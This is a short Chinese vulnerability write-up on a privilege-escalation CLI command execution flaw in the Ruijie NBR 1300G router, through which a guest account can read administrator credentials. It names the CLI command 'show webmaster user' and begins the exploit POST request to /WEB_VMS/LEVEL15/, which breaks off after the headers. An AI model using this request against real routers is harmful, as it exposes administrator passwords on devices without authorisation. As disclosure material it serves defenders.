# 锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞

## 漏洞描述
锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞，guest 账户可以越权获取管理员账号密码

参考链接：

- https://github.com/chaitin/xray/blob/master/pocs/ruijie-nbr1300g-cli-password-leak.yml

## 危害等级
CRITICAL

## 参考链接
- https://github.com/chaitin/xray/blob/master/pocs/ruijie-nbr1300g-cli-password-leak.yml
- http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%201300G%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html

## 漏洞复现方法
登录页面如下

![](images/锐捷%20NBR%201300G%20路由器%20越权%20CLI%20命令执行漏洞/file-20240904113419711.png)

执行 CLI 命令 `show webmaster user` 查看用户配置账号密码：

```plain
POST /WEB_VMS/LEVEL15/ HTTP/1.1
Host: 
Connection: keep-alive
